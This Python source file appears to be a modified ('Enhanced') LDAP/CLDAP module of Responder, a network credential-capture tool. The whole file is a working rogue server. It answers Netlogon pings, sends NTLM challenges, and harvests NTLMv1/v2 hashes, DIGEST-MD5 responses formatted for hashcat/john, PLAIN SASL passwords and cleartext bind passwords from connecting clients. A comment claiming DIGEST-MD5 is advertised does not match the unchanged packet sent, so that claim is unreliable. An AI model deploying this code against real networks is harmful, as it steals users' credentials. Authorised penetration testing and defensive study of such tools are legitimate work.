#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# Enhanced LDAP module with improved SASL mechanism support
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge, CLDAPNetlogon
from utils import *
import struct
import codecs
import random
import base64
import hashlib

def CalculateDNSName(name):
	if isinstance(name, bytes):
		name = name.decode('latin-1')
	name = name.split(".")
	DomainPrefix = struct.pack('B', len(name[0])).decode('latin-1')+name[0]
	Dnslen = ''
	for x in name:
		if len(x) >= 1:
			Dnslen += struct.pack('B', len(x)).decode('latin-1')+x
	return Dnslen, DomainPrefix

def ParseCLDAPNetlogon(data):
	try:
		Dns = data.find(b'DnsDomain')
		if Dns == -1:
			return False
		DnsName = data[Dns+9:]
		DnsGuidOff = data.find(b'DomainGuid')
		if DnsGuidOff == -1:
			return False
		Guid = data[DnsGuidOff+10:]
		if Dns:
			DomainLen = struct.unpack(">B", DnsName[1:2])[0]
			DomainName = DnsName[2:2+DomainLen]
		if Guid:
			DomainGuidLen = struct.unpack(">B", Guid[1:2])[0]
			DomainGuid = Guid[2:2+DomainGuidLen]
		return DomainName, DomainGuid
	except:
		pass

def ParseSearch(data):
	TID = data[8:9].decode('latin-1')
	
	if re.search(b'Netlogon', data):
		NbtName = settings.Config.MachineName
		TID = NetworkRecvBufferPython2or3(data[8:10])
		if TID[1] == "\x63":
			TID = "\x00"+TID[0]
		DomainName, DomainGuid = ParseCLDAPNetlogon(data)
		DomainGuid = NetworkRecvBufferPython2or3(DomainGuid)
		t = CLDAPNetlogon(MessageIDASNStr=TID, CLDAPMessageIDStr=TID, NTLogonDomainGUID=DomainGuid, NTLogonForestName=CalculateDNSName(DomainName)[0], NTLogonPDCNBTName=CalculateDNSName(NbtName)[0], NTLogonDomainNBTName=CalculateDNSName(NbtName)[0], NTLogonDomainNameShort=CalculateDNSName(DomainName)[1])
		t.calculate()
		return str(t)
	
	# Add DIGEST-MD5 to supported mechanisms
	if re.search(b'(?i)(objectClass0*.*supportedSASLMechanisms)', data):
		# Report enhanced SASL mechanisms including DIGEST-MD5
		if settings.Config.Verbose:
			print(text('[LDAP] Advertising SASL mechanisms: GSSAPI, GSS-SPNEGO, NTLM, DIGEST-MD5'))
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=TID, MessageIDASN2Str=TID))
	
	elif re.search(b'(?i)(objectClass0*.*supportedCapabilities)', data):
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=TID, MessageIDASN2Str=TID))
	
	elif re.search(b'(objectClass)', data):
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=TID))

def ParseLDAPHash(data, client, Challenge):
	"""Parse LDAP NTLMSSP v1/v2"""
	SSPIStart = data.find(b'NTLMSSP')
	if SSPIStart == -1:
		return
	
	SSPIString = data[SSPIStart:]
	if len(SSPIString) < 64:
		return
	
	try:
		LMhashLen    = struct.unpack('<H', data[SSPIStart+14:SSPIStart+16])[0]
		LMhashOffset = struct.unpack('<H', data[SSPIStart+16:SSPIStart+18])[0]
		LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen]
		LMHash       = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
		
		NthashLen    = struct.unpack('<H', data[SSPIStart+20:SSPIStart+22])[0]
		NthashOffset = struct.unpack('<H', data[SSPIStart+24:SSPIStart+26])[0]
		
		# NTLMv1
		if NthashLen == 24:
			SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
			SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
			DomainLen    = struct.unpack('<H', SSPIString[30:32])[0]
			DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
			Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
			UserLen      = struct.unpack('<H', SSPIString[38:40])[0]
			UserOffset   = struct.unpack('<H', SSPIString[40:42])[0]
			Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
			
			# Get hostname
			HostnameLen    = struct.unpack('<H', SSPIString[46:48])[0]
			HostnameOffset = struct.unpack('<H', SSPIString[48:50])[0]
			if HostnameLen > 0 and HostnameOffset + HostnameLen <= len(SSPIString):
				Hostname = SSPIString[HostnameOffset:HostnameOffset+HostnameLen].decode('UTF-16LE', errors='ignore')
			else:
				Hostname = ''
			
			WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, codecs.encode(Challenge, 'hex').decode('latin-1'))
			
			SaveToDb({
				'module': 'LDAP',
				'type': 'NTLMv1-SSP',
				'client': client,
				'hostname': Hostname,
				'user': Domain+'\\'+Username,
				'hash': SMBHash,
				'fullhash': WriteHash,
			})
		
		# NTLMv2
		elif NthashLen > 60:
			SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
			SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
			DomainLen    = struct.unpack('<H', SSPIString[30:32])[0]
			DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
			Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
			UserLen      = struct.unpack('<H', SSPIString[38:40])[0]
			UserOffset   = struct.unpack('<H', SSPIString[40:42])[0]
			Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
			
			# Get hostname
			HostnameLen    = struct.unpack('<H', SSPIString[46:48])[0]
			HostnameOffset = struct.unpack('<H', SSPIString[48:50])[0]
			if HostnameLen > 0 and HostnameOffset + HostnameLen <= len(SSPIString):
				Hostname = SSPIString[HostnameOffset:HostnameOffset+HostnameLen].decode('UTF-16LE', errors='ignore')
			else:
				Hostname = ''
			
			WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge, 'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
			
			SaveToDb({
				'module': 'LDAP',
				'type': 'NTLMv2-SSP',
				'client': client,
				'hostname': Hostname,
				'user': Domain+'\\'+Username,
				'hash': SMBHash,
				'fullhash': WriteHash,
			})
		
		if LMhashLen < 2 and settings.Config.Verbose:
			print(text("[LDAP] Ignoring anonymous NTLM authentication"))
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[LDAP] Error parsing NTLM hash: %s' % str(e)))

def ParseDIGESTMD5(data, client, Challenge):
	"""Parse DIGEST-MD5 SASL mechanism responses"""
	try:
		# Look for DIGEST-MD5 response
		digest_start = data.find(b'username="')
		if digest_start == -1:
			return None
		
		# Extract the digest response data
		response_str = data[digest_start:].decode('latin-1', errors='ignore')
		
		# Parse out the username
		username_match = re.search(r'username="([^"]+)"', response_str)
		realm_match = re.search(r'realm="([^"]+)"', response_str)
		nonce_match = re.search(r'nonce="([^"]+)"', response_str)
		cnonce_match = re.search(r'cnonce="([^"]+)"', response_str)
		nc_match = re.search(r'nc=([0-9a-fA-F]+)', response_str)
		qop_match = re.search(r'qop=([a-z\-]+)', response_str)
		uri_match = re.search(r'digest-uri="([^"]+)"', response_str)
		response_match = re.search(r'response=([0-9a-fA-F]+)', response_str)
		
		if username_match and response_match:
			username = username_match.group(1)
			realm = realm_match.group(1) if realm_match else ''
			nonce = nonce_match.group(1) if nonce_match else ''
			cnonce = cnonce_match.group(1) if cnonce_match else ''
			nc = nc_match.group(1) if nc_match else ''
			qop = qop_match.group(1) if qop_match else ''
			uri = uri_match.group(1) if uri_match else ''
			response = response_match.group(1)
			
			# Format for hashcat/john
			hash_string = '%s:$sasl$DIGEST-MD5$%s$%s$%s$%s$%s$%s$%s' % (username, realm, nonce, cnonce, nc, qop, uri, response)
			
			SaveToDb({
				'module': 'LDAP',
				'type': 'DIGEST-MD5',
				'client': client,
				'user': username,
				'hash': response,
				'fullhash': hash_string,
			})
			
			print(color("[*] [LDAP] Captured DIGEST-MD5 hash from %s for user %s" % (client.replace("::ffff:", ""), username), 3, 1))
			return True
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[LDAP] Error parsing DIGEST-MD5: %s' % str(e)))
	
	return None

def ParsePLAINSASL(data, client):
	"""Parse PLAIN SASL mechanism (cleartext credentials)"""
	try:
		# PLAIN SASL format: [authzid]\x00authcid\x00password
		# Find the SASL credentials in the packet
		sasl_start = data.find(b'\x04')  # Octet string tag
		if sasl_start == -1:
			return None
		
		# Skip the tag and length bytes
		sasl_data = data[sasl_start+2:]
		
		# Split by null bytes
		parts = sasl_data.split(b'\x00')
		if len(parts) >= 3:
			authzid = parts[0].decode('utf-8', errors='ignore')
			username = parts[1].decode('utf-8', errors='ignore')
			password = parts[2].decode('utf-8', errors='ignore')
			
			if username and password:
				SaveToDb({
					'module': 'LDAP',
					'type': 'PLAIN-SASL',
					'client': client,
					'user': username,
					'cleartext': password,
					'fullhash': username + ':' + password,
				})
				
				print(color("[*] [LDAP] Captured PLAIN SASL credentials from %s for user %s" % (client.replace("::ffff:", ""), username), 2, 1))
				return True
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[LDAP] Error parsing PLAIN SASL: %s' % str(e)))
	
	return None

def DetectSASLMechanism(data):
	"""Detect which SASL mechanism is being used"""
	try:
		if b'NTLMSSP' in data:
			return 'NTLM'
		elif b'DIGEST-MD5' in data or b'digest-uri=' in data:
			return 'DIGEST-MD5'
		elif b'PLAIN' in data:
			return 'PLAIN'
		elif b'GSSAPI' in data or b'GSS-SPNEGO' in data:
			# Try to extract NTLMSSP from GSSAPI wrapper
			if b'NTLMSSP' in data:
				return 'GSSAPI-NTLM'
			return 'GSSAPI'
	except:
		pass
	return None

def ParseNTLM(data, client, Challenge):
	"""Parse NTLM authentication"""
	if re.search(b'(NTLMSSP\x00\x01\x00\x00\x00)', data):
		# NTLMSSP NEGOTIATE - send CHALLENGE
		if settings.Config.Verbose:
			print(text('[LDAP] NTLMSSP NEGOTIATE from %s' % client.replace("::ffff:", "")))
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9].decode('latin-1'), NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
		NTLMChall.calculate()
		return NTLMChall
	
	elif re.search(b'(NTLMSSP\x00\x03\x00\x00\x00)', data):
		# NTLMSSP AUTH - parse hash
		if settings.Config.Verbose:
			print(text('[LDAP] NTLMSSP AUTH from %s' % client.replace("::ffff:", "")))
		ParseLDAPHash(data, client, Challenge)
		return None

def ParseCLDAPPacket(data, client, Challenge):
	if data[1:2] == b'\x84':
		Operation        = data[10:11]
		PacketLen        = struct.unpack('>i', data[2:6])[0]
		if Operation == b'\x84':
			Operation = data[9:10]
		sasl             = data[20:21]
		OperationHeadLen = struct.unpack('>i', data[11:15])[0]
		LDAPVersion      = struct.unpack('<b', data[17:18])[0]
		
		if Operation == b'\x60':  # Bind
			UserDomainLen  = struct.unpack('<b', data[19:20])[0]
			UserDomain     = data[20:20+UserDomainLen].decode('latin-1')
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]
			
			# Simple bind (cleartext)
			if AuthHeaderType == b'\x80':
				PassLen   = struct.unpack('<b', data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password  = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen].decode('latin-1')
				SaveToDb({
					'module': 'LDAP',
					'type': 'Cleartext',
					'client': client,
					'user': UserDomain,
					'cleartext': Password,
					'fullhash': UserDomain+':'+Password,
				})
			
			# SASL bind
			if sasl == b'\xA3':
				# Detect mechanism
				mechanism = DetectSASLMechanism(data)
				if mechanism == 'NTLM' or mechanism == 'GSSAPI-NTLM':
					Buffer = ParseNTLM(data, client, Challenge)
					return Buffer
				elif mechanism == 'DIGEST-MD5':
					ParseDIGESTMD5(data, client, Challenge)
				elif mechanism == 'PLAIN':
					ParsePLAINSASL(data, client)
				elif mechanism and settings.Config.Verbose:
					print(text('[CLDAP] Detected SASL mechanism: %s from %s' % (mechanism, client.replace("::ffff:", ""))))
		
		elif Operation == b'\x63':  # Search
			Buffer = ParseSearch(data)
			print(text('[CLDAP] Sent CLDAP pong to %s.' % client.replace("::ffff:", "")))
			return Buffer
		
		elif settings.Config.Verbose:
			print(text('[CLDAP] Operation not supported'))
	
	# Old simple bind format
	if data[5:6] == b'\x60':
		UserLen = struct.unpack("<b", data[11:12])[0]
		UserString = data[12:12+UserLen].decode('latin-1')
		PassLen = struct.unpack("<b", data[12+UserLen+1:12+UserLen+2])[0]
		PassStr = data[12+UserLen+2:12+UserLen+3+PassLen].decode('latin-1')
		if settings.Config.Verbose:
			print(text('[CLDAP] Attempting to parse an old simple Bind request.'))
		SaveToDb({
			'module': 'LDAP',
			'type': 'Cleartext',
			'client': client,
			'user': UserString,
			'cleartext': PassStr,
			'fullhash': UserString+':'+PassStr,
		})

def ParseLDAPPacket(data, client, Challenge):
	if data[1:2] == b'\x84':
		PacketLen        = struct.unpack('>i', data[2:6])[0]
		MessageSequence  = struct.unpack('<b', data[8:9])[0]
		Operation        = data[9:10]
		sasl             = data[20:21]
		OperationHeadLen = struct.unpack('>i', data[11:15])[0]
		LDAPVersion      = struct.unpack('<b', data[17:18])[0]
		
		if Operation == b'\x60':  # Bind
			UserDomainLen  = struct.unpack('<b', data[19:20])[0]
			UserDomain     = data[20:20+UserDomainLen].decode('latin-1')
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]
			
			# Simple bind (cleartext)
			if AuthHeaderType == b'\x80':
				PassLen   = struct.unpack('<b', data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password  = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen].decode('latin-1')
				SaveToDb({
					'module': 'LDAP',
					'type': 'Cleartext',
					'client': client,
					'user': UserDomain,
					'cleartext': Password,
					'fullhash': UserDomain+':'+Password,
				})
			
			# SASL bind
			if sasl == b'\xA3':
				# Detect mechanism
				mechanism = DetectSASLMechanism(data)
				if mechanism == 'NTLM' or mechanism == 'GSSAPI-NTLM':
					Buffer = ParseNTLM(data, client, Challenge)
					return Buffer
				elif mechanism == 'DIGEST-MD5':
					ParseDIGESTMD5(data, client, Challenge)
				elif mechanism == 'PLAIN':
					ParsePLAINSASL(data, client)
				elif mechanism and settings.Config.Verbose:
					print(text('[LDAP] Detected SASL mechanism: %s from %s' % (mechanism, client.replace("::ffff:", ""))))
		
		elif Operation == b'\x63':  # Search
			Buffer = ParseSearch(data)
			return Buffer
		
		elif settings.Config.Verbose:
			print(text('[LDAP] Operation not supported'))
	
	# Old simple bind format
	if data[5:6] == b'\x60':
		UserLen = struct.unpack("<b", data[11:12])[0]
		UserString = data[12:12+UserLen].decode('latin-1')
		PassLen = struct.unpack("<b", data[12+UserLen+1:12+UserLen+2])[0]
		PassStr = data[12+UserLen+2:12+UserLen+3+PassLen].decode('latin-1')
		if settings.Config.Verbose:
			print(text('[LDAP] Attempting to parse an old simple Bind request.'))
		SaveToDb({
			'module': 'LDAP',
			'type': 'Cleartext',
			'client': client,
			'user': UserString,
			'cleartext': PassStr,
			'fullhash': UserString+':'+PassStr,
		})

class LDAP(BaseRequestHandler):
	"""Enhanced LDAP handler with improved SASL support"""
	
	def handle(self):
		try:
			self.request.settimeout(1)
			data = self.request.recv(8092)
			Challenge = RandomChallenge()
			
			# Extended: Try up to 8 exchanges for multi-stage SASL
			for x in range(8):
				Buffer = ParseLDAPPacket(data, self.client_address[0], Challenge)
				if Buffer:
					self.request.send(NetworkSendBufferPython2or3(Buffer))
				data = self.request.recv(8092)
				if not data:
					break
		except:
			pass

class CLDAP(BaseRequestHandler):
	"""CLDAP (connectionless LDAP over UDP) handler"""
	
	def handle(self):
		try:
			data, soc = self.request
			Challenge = RandomChallenge()
			
			for x in range(1):
				Buffer = ParseCLDAPPacket(data, self.client_address[0], Challenge)
				if Buffer:
					soc.sendto(NetworkSendBufferPython2or3(Buffer), self.client_address)
				data, soc = self.request
		except:
			pass
